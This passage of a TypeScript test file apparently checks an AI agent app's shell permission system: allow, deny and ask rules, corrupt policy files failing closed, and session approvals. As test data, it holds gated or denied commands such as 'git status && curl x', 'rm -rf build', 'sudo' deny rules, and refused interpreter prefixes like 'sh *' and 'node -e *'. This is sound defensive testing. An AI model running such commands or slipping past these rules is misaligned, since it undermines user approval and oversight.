vi.mock("../../shared/windows-path-facts.js", async original => (await import("../../__tests__/support/simulated-win32-drive.js")).simulatedWindowsPathFacts(await original()));
vi.mock("../../shared/windows-configuration-handles.js", async original => (await import("../../__tests__/support/simulated-win32-drive.js")).simulatedConfigurationHandles(await original()));

import { withCurrentShellRuleVersion } from "../../shared/shell-rule-version.js";
import { canCreateSymlinks } from "../../__tests__/support/symlink-capability.js";
// Admission and deny rules precede floors; ask rules precede grants and corrupt policy denies.
import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdtempSync, mkdirSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

const { projectFixture } = vi.hoisted(() => ({ projectFixture: { root: "" } }));

vi.mock("node:fs", async (importOriginal) => {
  const actual = await importOriginal<typeof import("node:fs")>();
  const { resolve, sep } = await import("node:path");
  return {
    ...(await import("../../__tests__/support/simulated-win32-drive.js")).simulatedConfigurationFs(actual),
    // Discover repositories only inside the fixture, independent of host ancestors.
    existsSync: (path: import("node:fs").PathLike) => {
      const fold = (value: string) => process.platform === "win32" ? value.toLowerCase() : value;
      const candidate = fold(resolve(String(path)));
      const root = fold(resolve(projectFixture.root));
      if (candidate.endsWith(`${sep}.git`) && !candidate.startsWith(`${root}${sep}`)) return false;
      return actual.existsSync(path);
    },
  };
});

const TEST_HOME = mkdtempSync(join(tmpdir(), "ave-rules-home-"));
process.env.AVE_HOME = TEST_HOME;

import { PermissionManager } from "../permission-manager.js";
import { readPermissionsFile, updatePermissionsFile } from "../permissions-store.js";
import { PermissionRulesFileCorruptError, validatePermissionRule } from "../rules/rule-files.js";
import { refusedShellPrefix } from "../rules/shell-prefix-values.js";
import { parseRuleSpecifier } from "../rules/rule-specifier.js";
import { buildShellRuleApproval, shellRuleCoversCommand } from "../rules/shell-rule-approval.js";
import { inspectShellCommand, shellSensitivePathSignal } from "../rules/literal-shell-inspection.js";
import { projectRulesLocation } from "../rules/project-rule-files.js";
import {
  captureApprovalWorkingDirectory,
  UserApprovalStoreCorruptError,
  lookupApproval,
  readApprovals,
  recordApproval,
  listApprovals,
  listSessionApprovals,
  revokeApprovalByKey,
  __resetSessionStoreForTest,
} from "../user-approval-store.js";
import { resolveUserApprovalVerdict } from "../../shared/permissions-events.js";
import { canonicalStringify as canonicalJson } from "../../shared/canonical-json.js";
import { ApprovalGate, type ApprovalRequest } from "../approval-gate.js";
import { buildPermissionEvaluationContext } from "../evaluation-context.js";
import { classifyApprovalRuleVerdict } from "../../tools/pipeline/approval-memory-skip.js";
import { runWithToolExecutionCwd } from "../../tools/execution-context.js";
import { ToolExecutor } from "../../tools/executor.js";
import { ToolRegistry } from "../../tools/registry.js";
import { BashTool } from "../../tools/shell-tools.js";
import { userPermissionContext } from "../../tools/__tests__/tool-context-fixture.js";

let dir: string;
let fixtureParent: string;
let permissionsFile: string;
let project: string;

beforeEach(() => {
  fixtureParent = realpathSync(mkdtempSync(join(tmpdir(), "ave-rules-")));
  // Exercise an enclosing repository without depending on the host's layout.
  mkdirSync(join(fixtureParent, ".git"));
  dir = join(fixtureParent, "fixture");
  mkdirSync(dir);
  projectFixture.root = dir;
  permissionsFile = join(dir, "permissions.json");
  project = join(dir, "project");
  mkdirSync(project);
  const home = join(dir, "home");
  mkdirSync(home);
  vi.stubEnv("HOME", home);
  vi.stubEnv("USERPROFILE", home);
});
afterEach(() => {
  vi.unstubAllEnvs();
  rmSync(dir, { recursive: true, force: true });
});
afterEach(() => rmSync(fixtureParent, { recursive: true, force: true }));
afterAll(() => rmSync(TEST_HOME, { recursive: true, force: true }));

const shell = (command: string) => ({ shellExecution: { runsSandboxed: false }, ruleSubject: { kind: "shell" as const, dialect: "bash" as const, command } });

describe("Store A (user-global permissions.json)", () => {
  it("fails clearly on corrupt JSON and never overwrites the file", async () => {
    writeFileSync(permissionsFile, "{ not json");
    await expect(readPermissionsFile(permissionsFile)).rejects.toBeInstanceOf(PermissionRulesFileCorruptError);
    await expect(updatePermissionsFile(permissionsFile, (f) => { f.rules.push({ pattern: "x", action: "allow" }); }))
      .rejects.toBeInstanceOf(PermissionRulesFileCorruptError);
    expect(readFileSync(permissionsFile, "utf8")).toBe("{ not json");
  });

  it("names the one bad rule and its line so the user can fix it", async () => {
    const text = [
      "{",
      "  \"version\": 1,",
      "  \"note\": \"rules: [a, b]\",",
      "  \"rules\": [",
      "    { \"pattern\": \"Bash(git status)\", \"action\": \"allow\" },",
      "    {",
      "      \"pattern\": \"Bash(git push --force)\",",
      "      \"action\": \"allow\"",
      "    }",
      "  ]",
      "}",
    ].join("\n");
    writeFileSync(permissionsFile, text);
    await expect(readPermissionsFile(permissionsFile)).rejects.toThrow(
      /rule 2 at line 6: Invalid permission rule "Bash\(git push --force\)": .*refused allow prefix/,
    );
    // A missing comma: the parser reports a position, surfaced as line/column.
    writeFileSync(permissionsFile, "{\n  \"version\": 1\n  \"rules\": []\n}");
    await expect(readPermissionsFile(permissionsFile)).rejects.toThrow(/invalid JSON at line 3 column \d+/);
    // A project file names the rule the same way.
    const location = projectRulesLocation(dir, project);
    mkdirSync(join(dir, "permissions", "project-rules"), { recursive: true });
    writeFileSync(location.filePath, JSON.stringify({ version: 1, projectRoot: location.projectRoot, rules: [{ pattern: "Bash(ls *)", action: "allow" }, { pattern: "Bash(*)", action: "allow" }] }, null, 2));
    const pm = new PermissionManager(permissionsFile.replace("permissions.json", "other.json"));
    await pm.ensureProjectRulesLoaded(project);
    expect(pm.checkDetailed("bash", "builtin", "shell", null, { ...shell("ls"), projectRulesCwd: project }))
      .toMatchObject({ decision: "deny", reasonCode: "policy-unreadable", reason: expect.stringMatching(/rule 2 at line 9: Invalid permission rule "Bash\(\*\)"/) });
  });

  it.each([
    [{ pattern: "Bash(git push --force)", action: "allow" }, /refused allow prefix/],
    [{ pattern: "Bash(*)", action: "allow" }, /bare \*/],
    [{ pattern: "Bash(git  status)", action: "deny" }, /single spaces/],
    [{ pattern: "Mcp(demo:*)", action: "allow" }, /tool name/],
    [{ pattern: "web_fetch", action: "maybe" }, /unknown action/],
  ])("treats an out-of-language rule as corrupt: %j", async (rule, message) => {
    writeFileSync(permissionsFile, JSON.stringify({ version: 1, rules: [rule], mode: "default", updatedAt: "" }));
    await expect(readPermissionsFile(permissionsFile)).rejects.toThrow(message);
  });

  it("keeps legacy glob rules and refused prefixes as deny rules", async () => {
    const legacy = { version: 1, rules: [
      { pattern: "web_fetch", action: "allow", tier: "read" },
      { pattern: "write_file:path:/abs/a(b)", action: "allow" },
      { pattern: "Bash(sudo *)", action: "deny" },
    ], mode: "default", updatedAt: "" };
    writeFileSync(permissionsFile, JSON.stringify(legacy));
    await expect(readPermissionsFile(permissionsFile)).resolves.toMatchObject({ rules: legacy.rules });
  });

  it("a corrupt file fails every decision closed with a visible reason", async () => {
    writeFileSync(permissionsFile, "[]");
    const pm = new PermissionManager(permissionsFile);
    pm.setRules([{ pattern: "skill_list", action: "allow" }]);
    await pm.loadRulesFromFile();
    expect(pm.getRulesLoadError()).toMatch(/is corrupt/);
    for (const [tool, category] of [["write_file", "write"], ["web_fetch", "network"], ["bash", "shell"]] as const) {
      expect(pm.checkDetailed(tool, "builtin", category)).toMatchObject({ decision: "deny", reasonCode: "policy-unreadable", reason: expect.stringMatching(/is corrupt/) });
    }
    // Unread deny rules also block reads until the policy can be repaired.
    expect(pm.checkDetailed("read_file", "builtin", "read")).toMatchObject({ decision: "deny", reasonCode: "policy-unreadable" });
    pm.setMode("allow");
    expect(pm.checkDetailed("bash", "builtin", "shell", null, shell("ls"))).toMatchObject({ decision: "deny", reasonCode: "policy-unreadable" });
  });
});

describe("decision path", () => {
  it.each([undefined, "", "/"])("can save and evaluate a project rule with HOME=%j", async (home) => {
    vi.stubEnv("HOME", home);
    vi.stubEnv("USERPROFILE", home);
    const pm = new PermissionManager(permissionsFile);
    await pm.addRulePersist({ pattern: "Bash(printf ready)", action: "allow" }, { kind: "project", projectCwd: project });
    const restarted = new PermissionManager(permissionsFile);
    await restarted.ensureProjectRulesLoaded(project);
    expect(restarted.checkDetailed("bash", "builtin", "shell", null, { ...shell("printf ready"), projectRulesCwd: project }))
      .toMatchObject({ decision: "allow" });
    const sibling = join(dir, "sibling");
    mkdirSync(sibling);
    await restarted.ensureProjectRulesLoaded(sibling);
    expect(restarted.checkDetailed("bash", "builtin", "shell", null, { ...shell("printf ready"), projectRulesCwd: sibling }))
      .toMatchObject({ decision: "ask" });
  });

  it("stored Bash rules survive restart but require a proven shell subject", async () => {
    const pm = new PermissionManager(permissionsFile);
    await pm.addRulePersist({ pattern: "Bash(git status *)", action: "allow" }, { kind: "user" });
    // A shell grant still needs a complete literal rule proof; unsupported command shapes follow mode policy.
    expect(pm.checkDetailed("bash", "builtin", "shell", null, shell("git status -s"))).toMatchObject({ decision: "ask" });
    await pm.addRulePersist({ pattern: "Bash(git status)", action: "allow" }, { kind: "user" });

    const restarted = new PermissionManager(permissionsFile);
    await restarted.loadRulesFromFile();
    const unproven = restarted.checkDetailed("bash", "builtin", "shell", null, shell("git status"));
    expect(unproven).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
    expect(unproven.forceModal).toBeUndefined();
    await restarted.addRulePersist({ pattern: "Bash(printf ready)", action: "allow" }, { kind: "user" });
    const proven = new PermissionManager(permissionsFile);
    await proven.loadRulesFromFile();
    expect(proven.checkDetailed("bash", "builtin", "shell", null, shell("printf ready"))).toMatchObject({ decision: "allow" });
    expect(restarted.checkDetailed("bash", "builtin", "shell", null, shell("git push"))).toMatchObject({ decision: "ask" });
    // No subject → the specifier never matches the tool name.
    expect(restarted.checkDetailed("bash", "builtin", "shell")).toMatchObject({ decision: "ask" });
    // A compound with an uncovered part is not allowed.
    expect(restarted.checkDetailed("bash", "builtin", "shell", null, shell("git status && curl x"))).toMatchObject({ decision: "ask" });
  });

  it("refuses to persist an listed broad interpreter or wrapper allow prefix", async () => {
    const pm = new PermissionManager(permissionsFile);
    for (const pattern of ["Bash(python *)", "Bash(sh *)", "Bash(env *)", "Bash(node -e *)", "Bash(git *)"]) {
      await expect(pm.addRulePersist({ pattern, action: "allow" }, { kind: "user" }), pattern).rejects.toThrow(/refused allow prefix/);
    }
    await expect(pm.addRulePersist({ pattern: "web_fetch", action: "allow" }, { kind: "user" })).rejects.toThrow(/legacy pattern/);
    await expect(readPermissionsFile(permissionsFile)).resolves.toBeNull();
  });

  it("keeps deny and ask precedence across scopes before ordinary mode policy", async () => {
    const pm = new PermissionManager(permissionsFile);
    await pm.addRulePersist({ pattern: "Bash(git log -5)", action: "allow" }, { kind: "user" });
    await pm.addRulePersist({ pattern: "Bash(git log --all *)", action: "deny" }, { kind: "project", projectCwd: project });
    await pm.addRulePersist({ pattern: "Bash(git log origin/main)", action: "ask" }, { kind: "project", projectCwd: project });
    await pm.ensureProjectRulesLoaded(project);
    const ctx = (command: string) => ({ ...shell(command), projectRulesCwd: project });
    expect(pm.checkDetailed("bash", "builtin", "shell", null, ctx("git log --all x"))).toMatchObject({ decision: "deny" });
    const ask = pm.checkDetailed("bash", "builtin", "shell", null, ctx("git log origin/main"));
    expect(ask).toMatchObject({ decision: "ask", reasonCode: "rule-ask" });
    expect(ask.forceModal).toBeUndefined();
    expect(pm.checkDetailed("bash", "builtin", "shell", null, ctx("git log -5"))).toMatchObject({ decision: "ask", reasonCode: "shell-approval" });
    pm.setMode("allow");
    expect(pm.checkDetailed("bash", "builtin", "shell", null, ctx("git log origin/main"))).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
    expect(pm.checkDetailed("bash", "builtin", "shell", null, ctx("sudo git log --all x"))).toMatchObject({ decision: "deny" });
    // An opaque nested shell without a forced signal follows the ordinary host-shell mode.
    expect(pm.checkDetailed("bash", "builtin", "shell", null, ctx("bash -c 'git log --all x'"))).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
  });

  it("project rules live in Ave home, keyed by the canonical project root, and never in the repo", async () => {
    const pm = new PermissionManager(permissionsFile);
    await pm.addRulePersist({ pattern: "Bash(printf ready)", action: "allow" }, { kind: "project", projectCwd: project });
    const location = projectRulesLocation(dir, project);
    expect(location.filePath.startsWith(join(dir, "permissions", "project-rules"))).toBe(true);
    expect(JSON.parse(readFileSync(location.filePath, "utf8"))).toMatchObject({ version: 1, projectRoot: location.projectRoot, rules: [{ pattern: "Bash(printf ready)", action: "allow" }] });
    await expect(pm.listProjectRules(project)).resolves.toMatchObject({ ok: true, rules: [{ pattern: "Bash(printf ready)" }] });
    // A sibling project does not inherit it.
    const sibling = join(dir, "sibling");
    mkdirSync(sibling);
    await pm.ensureProjectRulesLoaded(sibling);
    expect(pm.checkDetailed("bash", "builtin", "shell", null, { ...shell("printf ready"), projectRulesCwd: sibling })).toMatchObject({ decision: "ask" });
    await pm.ensureProjectRulesLoaded(project);
    expect(pm.checkDetailed("bash", "builtin", "shell", null, { ...shell("printf ready"), projectRulesCwd: project })).toMatchObject({ decision: "allow" });
    await pm.removeRulePersist({ pattern: "Bash(printf ready)", action: "allow" }, { kind: "project", projectCwd: project });
    expect(pm.checkDetailed("bash", "builtin", "shell", null, { ...shell("printf ready"), projectRulesCwd: project })).toMatchObject({ decision: "ask" });
  });

  it("denies writes and reads when the approval policy store is corrupt", () => {
    const pm = new PermissionManager(permissionsFile);
    pm.setMode("allow");
    const error = "Saved approvals file /x/user-approvals.json is corrupt: invalid JSON";
    expect(pm.checkDetailed("write_file", "builtin", "write", null, { permissionStoreError: error }))
      .toMatchObject({ decision: "deny", reasonCode: "policy-unreadable", reason: error });
    expect(pm.checkDetailed("read_file", "builtin", "read", null, { permissionStoreError: error })).toMatchObject({ decision: "deny", reasonCode: "policy-unreadable", reason: error });
  });

  it("a corrupt project file fails that project closed; a decision for an unloaded project throws", async () => {
    const pm = new PermissionManager(permissionsFile);
    const location = projectRulesLocation(dir, project);
    mkdirSync(join(dir, "permissions", "project-rules"), { recursive: true });
    writeFileSync(location.filePath, JSON.stringify({ version: 1, projectRoot: "/elsewhere", rules: [] }));
    expect(() => pm.checkDetailed("bash", "builtin", "shell", null, { ...shell("ls"), projectRulesCwd: project })).toThrow(/not loaded/);
    await pm.ensureProjectRulesLoaded(project);
    expect(pm.checkDetailed("bash", "builtin", "shell", null, { ...shell("ls"), projectRulesCwd: project }))
      .toMatchObject({ decision: "deny", reasonCode: "policy-unreadable", reason: expect.stringMatching(/projectRoot does not match/) });
    await expect(pm.addRulePersist({ pattern: "Bash(ls *)", action: "allow" }, { kind: "project", projectCwd: project })).rejects.toBeInstanceOf(PermissionRulesFileCorruptError);
    writeFileSync(location.filePath, JSON.stringify({ version: 1, projectRoot: location.projectRoot, rules: [{ pattern: "web_fetch", action: "allow" }] }));
    await expect(pm.listProjectRules(project)).resolves.toMatchObject({ ok: false, error: expect.stringMatching(/specifiers only/) });
  });

  it("project rules key to the git root, so subdirectory sessions share them", async () => {
    const repo = join(dir, "repo");
    mkdirSync(join(repo, ".git"), { recursive: true });
    mkdirSync(join(repo, ".git", "objects"));
    mkdirSync(join(repo, ".git", "refs"));
    writeFileSync(join(repo, ".git", "HEAD"), "ref: refs/heads/main\n");
    mkdirSync(join(repo, "packages", "app"), { recursive: true });
    const pm = new PermissionManager(permissionsFile);
    await pm.addRulePersist({ pattern: "Bash(printf ready)", action: "allow" }, { kind: "project", projectCwd: join(repo, "packages", "app") });
    expect(projectRulesLocation(dir, join(repo, "packages", "app")).filePath).toBe(projectRulesLocation(dir, repo).filePath);
    expect(projectRulesLocation(dir, join(repo, "packages", "app")).projectRoot).toBe(captureApprovalWorkingDirectory(repo).path);
    await pm.ensureProjectRulesLoaded(repo);
    expect(pm.checkDetailed("bash", "builtin", "shell", null, { ...shell("printf ready"), projectRulesCwd: repo })).toMatchObject({ decision: "allow" });
    // Outside a repository the cwd itself is the project.
    expect(projectRulesLocation(dir, project).projectRoot).toBe(captureApprovalWorkingDirectory(project).path);
  });

  it("a project allow in one non-repository folder never reaches a sibling under a home repository", async () => {
    const home = process.env.HOME!;
    mkdirSync(join(home, ".git"));
    mkdirSync(join(home, ".git", "objects"));
    mkdirSync(join(home, ".git", "refs"));
    writeFileSync(join(home, ".git", "HEAD"), "ref: refs/heads/main\n");
    const a = join(home, "a");
    const b = join(home, "b");
    mkdirSync(a);
    mkdirSync(b);
    const pm = new PermissionManager(permissionsFile);
    await pm.addRulePersist({ pattern: "Bash(printf ready)", action: "allow" }, { kind: "project", projectCwd: a });
    const restarted = new PermissionManager(permissionsFile);
    for (const [cwd, decision] of [[a, "allow"], [b, "ask"]] as const) {
      await restarted.ensureProjectRulesLoaded(cwd);
      expect(restarted.checkDetailed("bash", "builtin", "shell", null, { ...shell("printf ready"), projectRulesCwd: cwd }))
        .toMatchObject({ decision });
    }
    expect(projectRulesLocation(dir, a).identity).not.toBe(projectRulesLocation(dir, b).identity);
  });

  it.skipIf(!canCreateSymlinks())("project rules follow the shell call's own cwd, resolved with realpath", async () => {
    // The session runs in repo A; the call runs in a nested repo B, reached through a symlink (inside A, so no out-of-directory grant is involved).
    const repoA = join(dir, "a");
    const repoB = join(repoA, "vendor", "b");
    mkdirSync(join(repoA, ".git"), { recursive: true });
    mkdirSync(join(repoB, ".git"), { recursive: true });
    mkdirSync(join(repoA, ".git", "objects"));
    mkdirSync(join(repoA, ".git", "refs"));
    mkdirSync(join(repoB, ".git", "objects"));
    mkdirSync(join(repoB, ".git", "refs"));
    writeFileSync(join(repoA, ".git", "HEAD"), "ref: refs/heads/main\n");
    writeFileSync(join(repoB, ".git", "HEAD"), "ref: refs/heads/main\n");
    symlinkSync(repoB, join(repoA, "b-link"), "junction");
    const pm = new PermissionManager(permissionsFile);
    pm.setMode("allow");
    await pm.addRulePersist({ pattern: "Bash(printf *)", action: "deny" }, { kind: "project", projectCwd: repoB });
    const check = vi.spyOn(pm, "checkDetailed");
    const registry = new ToolRegistry();
    const bash = new BashTool();
    const execute = vi.spyOn(bash, "execute");
    registry.register(bash);
    const executor = new ToolExecutor(registry, undefined, pm, undefined, { requestAndWait: vi.fn() } as never);

    const [result] = await runWithToolExecutionCwd(repoA, () => executor.executeAll(
      [{ id: "project-cwd", name: "bash", input: { command: "printf hi", cwd: "b-link" } }],
      { sessionId: "project-cwd", permissionContext: userPermissionContext() },
    ));

    const context = check.mock.calls[0]![4]!;
    expect(projectRulesLocation(dir, context.projectRulesCwd!).projectRoot).toBe(captureApprovalWorkingDirectory(repoB).path);
    expect(context.ruleSubject).toMatchObject({ kind: "shell", cwd: join(repoA, "b-link") });
    expect(check.mock.results[0]!.value).toMatchObject({ decision: "deny" });
    expect(execute).not.toHaveBeenCalled();
    expect(result!.is_error).toBe(true);
    // The session cwd's (empty) project file is not what decided the call.
    await pm.ensureProjectRulesLoaded(repoA);
    expect(pm.checkDetailed("bash", "builtin", "shell", null, { ...shell("printf hi"), projectRulesCwd: repoA })).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
  });

  it("re-reads a project rule file when it changes on disk", async () => {
    const pm = new PermissionManager(permissionsFile);
    await pm.ensureProjectRulesLoaded(project);
    const ctx = { ...shell("printf ready"), projectRulesCwd: project };
    expect(pm.checkDetailed("bash", "builtin", "shell", null, ctx)).toMatchObject({ decision: "ask" });
    const location = projectRulesLocation(dir, project);
    mkdirSync(join(dir, "permissions", "project-rules"), { recursive: true });
    writeFileSync(location.filePath, JSON.stringify({ version: 1, projectRoot: location.projectRoot, rules: [withCurrentShellRuleVersion({ pattern: "Bash(printf ready)", action: "allow" })] }));
    await pm.ensureProjectRulesLoaded(project);
    expect(pm.checkDetailed("bash", "builtin", "shell", null, ctx)).toMatchObject({ decision: "allow" });
    writeFileSync(location.filePath, "{ broken");
    await pm.ensureProjectRulesLoaded(project);
    expect(pm.checkDetailed("bash", "builtin", "shell", null, ctx)).toMatchObject({ decision: "deny", reasonCode: "policy-unreadable" });
  });

  it("a specifier deny never hides the tool from the model", async () => {
    const pm = new PermissionManager(permissionsFile);
    await pm.addRulePersist({ pattern: "Bash(rm *)", action: "deny" }, { kind: "user" });
    await pm.addAlwaysDeniedPersist("web_fetch");
    expect(pm.getVisibilityDenyRules()).toEqual([{ pattern: "web_fetch" }]);
  });
});

describe("Store B coexistence", () => {
  beforeEach(() => {
    mkdirSync(join(TEST_HOME, "permissions"), { recursive: true });
    __resetSessionStoreForTest();
  });
  afterEach(() => rmSync(join(TEST_HOME, "permissions"), { recursive: true, force: true }));

  it("existing exact entries keep matching unchanged", async () => {
    await recordApproval("bash", "{\"command\":\"npm test\"}", "builtin", { scope: "persistent", verdictAtApproval: "medium", nlJustification: null });
    await expect(lookupApproval("bash", "{\"command\":\"npm test\"}", "builtin")).resolves.toMatchObject({ scope: "persistent" });
    await expect(lookupApproval("bash", "{\"command\":\"npm test -- x\"}", "builtin")).resolves.toBeNull();
  });

  it("a malformed approvals file fails clearly instead of reading as empty", async () => {
    writeFileSync(join(TEST_HOME, "permissions", "user-approvals.json"), JSON.stringify({ entries: {} }));
    await expect(readApprovals()).rejects.toBeInstanceOf(UserApprovalStoreCorruptError);
    await expect(recordApproval("bash", "{}", "builtin", { scope: "persistent", verdictAtApproval: "low", nlJustification: null }))
      .rejects.toBeInstanceOf(UserApprovalStoreCorruptError);
    expect(JSON.parse(readFileSync(join(TEST_HOME, "permissions", "user-approvals.json"), "utf8"))).toEqual({ entries: {} });
  });
});

describe("gate: unreviewed shell in default mode", () => {
  beforeEach(() => __resetSessionStoreForTest());

  it.each([
    ["ls -la", "low", true],
    ["npm test", "medium", true],
    ["rm -rf build", "high", true],
    [null, undefined, true],
  ] as const)("%s → verdict %s, remember offered: %s", async (command, level, rememberable) => {
    const args = { command: command ?? "ls" };
    const ruleVerdict = command === null ? undefined : classifyApprovalRuleVerdict({
      toolName: "bash", source: "builtin", category: "shell", pathFields: [], finalInput: args,
      executionCwd: project, allowedDirectories: [project], sensitivePathsAdjacent: [],
      context: { trustOrigin: "user-keyboard" } as never, sandboxAttestation: {},
    }).verdict;
    expect(ruleVerdict?.level).toBe(level);
    let displayed: ApprovalRequest | undefined;
    const nativeWebContents = { isDestroyed: () => false, send: (channel: string, request: ApprovalRequest) => {
      if (channel === "ave:approval:request") displayed = request;
    } };
    const gate = new ApprovalGate(nativeWebContents as never);
    const id = `unreviewed-${String(level)}`;
    const pending = gate.requestAndWait({
      id, category: "tool", toolName: "bash", toolCategory: "shell", source: "builtin",
      args, reason: "user confirmation required", createdAt: Date.now(), trustOrigin: "user-keyboard",
      ...(ruleVerdict ? { ruleVerdict } : {}),
      evaluationContext: buildPermissionEvaluationContext({
        policyMode: "default", headless: false, source: "builtin", category: "shell",
        trustOrigin: "user-keyboard", executionCwd: project, allowedDirectories: [project],
        pathFields: [], targetFilePaths: [], sensitivePathsAdjacent: [],
      }),
    });
    expect(displayed).toMatchObject({ persistentAllowAllowed: rememberable });
    expect(displayed!.allowedChoices).toBeUndefined();
    expect(displayed!.exactRecordAllowed).toBe(true);
    if (command === "rm -rf build") expect(displayed!.shellRule).toMatchObject({ exactRule: null, persistentAllowed: false, sessionAllowed: false });
    gate.resolveFromDesktopRenderer(id, { requestId: id, choice: "deny-once", nonce: displayed!.nonce, hmac: displayed!.hmac }, nativeWebContents as never);
    await pending;
  });
});

describe("shell verdict for the dock (no blanket shell → HIGH)", () => {
  it("uses the host rule verdict, keeps HIGH for destructive, and fails closed without one", () => {
    expect(resolveUserApprovalVerdict({ toolCategory: "shell", ruleVerdict: { level: "low" } })).toBe("low");
    expect(resolveUserApprovalVerdict({ toolCategory: "shell", ruleVerdict: { level: "medium" } })).toBe("medium");
    expect(resolveUserApprovalVerdict({ toolCategory: "shell", ruleVerdict: { level: "high" } })).toBe("high");
    expect(resolveUserApprovalVerdict({ toolCategory: "shell" })).toBe("high");
    expect(resolveUserApprovalVerdict({ toolCategory: "shell", reviewerVerdict: { level: "high" }, ruleVerdict: { level: "low" } })).toBe("high");
  });
});

describe("scoped rule management", () => {
  it("lists unvisited projects and retains corrupt sibling errors", async () => {
    const secondProject = join(dir, "second-project");
    mkdirSync(secondProject);
    const writer = new PermissionManager(permissionsFile);
    await writer.addRulePersist({ pattern: "Bash(git status *)", action: "allow" }, { kind: "user" });
    await writer.addRulePersist({ pattern: "Bash(ls *)", action: "allow" }, { kind: "project", projectCwd: project });
    const corrupt = projectRulesLocation(dir, secondProject);
    writeFileSync(corrupt.filePath, "{broken");
    const fresh = new PermissionManager(permissionsFile);
    const listed = await fresh.listScopedRules();
    const fixtureRoot = fixtureParent.replaceAll("\\", "/").replace(/^[A-Z]:/, (drive) => drive.toLowerCase());
    expect(listed.rules).toEqual(expect.arrayContaining([
      expect.objectContaining({ pattern: "Bash(git status *)", scope: "user" }),
      expect.objectContaining({ pattern: "Bash(ls *)", scope: "project", projectCwd: `${fixtureRoot}/fixture/project` }),
    ]));
    expect(listed.errors).toEqual([{ filePath: corrupt.filePath, errorCode: "rules-file-unavailable" }]);
    const projectRow = listed.rules.find((rule) => rule.scope === "project")!;
    expect(projectRow.storedFile).toBe(projectRulesLocation(dir, project).identity);
    await fresh.removeRulePersist(projectRow, { kind: "project", projectCwd: projectRow.projectCwd!, storedFile: projectRow.storedFile! });
    expect((await fresh.listScopedRules()).rules).toHaveLength(1);
    expect(readFileSync(corrupt.filePath, "utf8")).toBe("{broken");
  });

  it("lists and revokes rules from a stale file by its stored identity without rewriting its root", async () => {
    const elsewhere = join(dir, "moved-project");
    mkdirSync(elsewhere);
    // A file whose stored root no longer derives its own name (the project moved).
    const stale = projectRulesLocation(dir, elsewhere);
    mkdirSync(dirname(stale.filePath), { recursive: true });
    writeFileSync(stale.filePath, JSON.stringify({
      version: 1, projectRoot: project, updatedAt: "", rules: [{ pattern: "Bash(ls *)", action: "allow" }, { pattern: "Bash(pwd *)", action: "allow" }],
    }));
    const manager = new PermissionManager(permissionsFile);
    const listed = await manager.listScopedRules();
    expect(listed.errors).toEqual([{ filePath: stale.filePath, errorCode: "rules-file-unavailable" }]);
    const row = listed.rules.find((rule) => rule.pattern === "Bash(ls *)")!;
    expect(row).toMatchObject({ scope: "project", projectCwd: project, storedFile: stale.identity });
    await manager.removeRulePersist(row, { kind: "project", projectCwd: row.projectCwd!, storedFile: row.storedFile! });
    const after = JSON.parse(readFileSync(stale.filePath, "utf8"));
    expect(after.projectRoot).toBe(project);
    expect(after.rules).toEqual([{ pattern: "Bash(pwd *)", action: "allow" }]);
  });

  it("preserves live user rules when a corrupt file prevents revoke", async () => {
    const manager = new PermissionManager(permissionsFile);
    await manager.addRulePersist({ pattern: "Bash(ls)", action: "allow" }, { kind: "user" });
    writeFileSync(permissionsFile, "{broken");
    await expect(manager.removeRulePersist({ pattern: "Bash(ls)", action: "allow" }, { kind: "user" })).rejects.toThrow(/corrupt/);
    expect(manager.checkDetailed("bash", "builtin", "shell", null, shell("ls"))).toMatchObject({ decision: "allow" });
  });
});

describe("conversation-scoped exact decisions", () => {
  beforeEach(() => { __resetSessionStoreForTest(); rmSync(join(TEST_HOME, "permissions", "user-approvals.json"), { force: true }); });

  it("matches only the named conversation and revokes without creating disk state", async () => {
    const identity = captureApprovalWorkingDirectory(project).identity;
    await recordApproval("bash", "{}", "builtin", { scope: "session", verdictAtApproval: "low", nlJustification: null, sessionId: "conversation-a", workingDirectoryIdentity: identity, projectCwd: project });
    expect(await lookupApproval("bash", "{}", "builtin", undefined, undefined, project, "conversation-a")).toMatchObject({ sessionId: "conversation-a" });
    expect(await lookupApproval("bash", "{}", "builtin", undefined, undefined, project, "conversation-b")).toBeNull();
    expect(await lookupApproval("bash", "{}", "builtin", undefined, undefined, project)).toBeNull();
    const rows = await listApprovals();
    expect(rows).toEqual([expect.objectContaining({ sessionId: "conversation-a", projectCwd: project, scope: "session" })]);
    await revokeApprovalByKey(rows[0].key);
    expect(await listApprovals()).toEqual([]);
    await expect(readApprovals()).resolves.toEqual({ approvals: {} });
  });

  it("refuses a session approval that names no conversation", async () => {
    await expect(recordApproval("browser_click", "{}", "builtin", { scope: "session", verdictAtApproval: "low", nlJustification: null }))
      .rejects.toThrow(/requires its conversation session/);
    expect(listSessionApprovals()).toEqual([]);
  });
});

// Owner decision 2026-10-23: every session allow (not only shell) belongs to the root conversation, resolved by the one resolver the judge also uses.
describe("non-shell session approvals are keyed by the root conversation", () => {
  const ROOT_A = "11111111-1111-4111-8111-111111111111";
  const ROOT_B = "22222222-2222-4222-8222-222222222222";
  const CHILD_A = "sub-aa-33333333-3333-4333-8333-333333333333";
  const GRANDCHILD_A = "sub-ab-44444444-4444-4444-8444-444444444444";
  const CHILD_B = "sub-ba-55555555-5555-4555-8555-555555555555";
  const origins: Record<string, string> = { [CHILD_A]: ROOT_A, [GRANDCHILD_A]: CHILD_A, [CHILD_B]: ROOT_B };
  const tools = [
    { tool: "browser_click", args: canonicalJson({ selector: "#submit", tabId: "tab-1" }) },
    { tool: "terminal_run", args: canonicalJson({ command: "make build" }) },
    { tool: "write_file", args: canonicalJson({ path: "/tmp/out.txt" }) },
  ];
  beforeEach(async () => {
    __resetSessionStoreForTest();
    rmSync(join(TEST_HOME, "permissions", "user-approvals.json"), { force: true });
    const { setApprovalConversationRootResolver } = await import("../user-approval-store.js");
    const { createRootSessionResolver } = await import("../root-session-resolver.js");
    setApprovalConversationRootResolver(createRootSessionResolver((id) => origins[id]));
  });
  const record = (tool: string, args: string, sessionId: string) => recordApproval(tool, args, "builtin", {
    scope: "session", verdictAtApproval: "low", nlJustification: null, sessionId,
  });

  it.each(tools)("shares a parent's $tool allow with its sub-agents at any depth", async ({ tool, args }) => {
    await record(tool, args, ROOT_A);
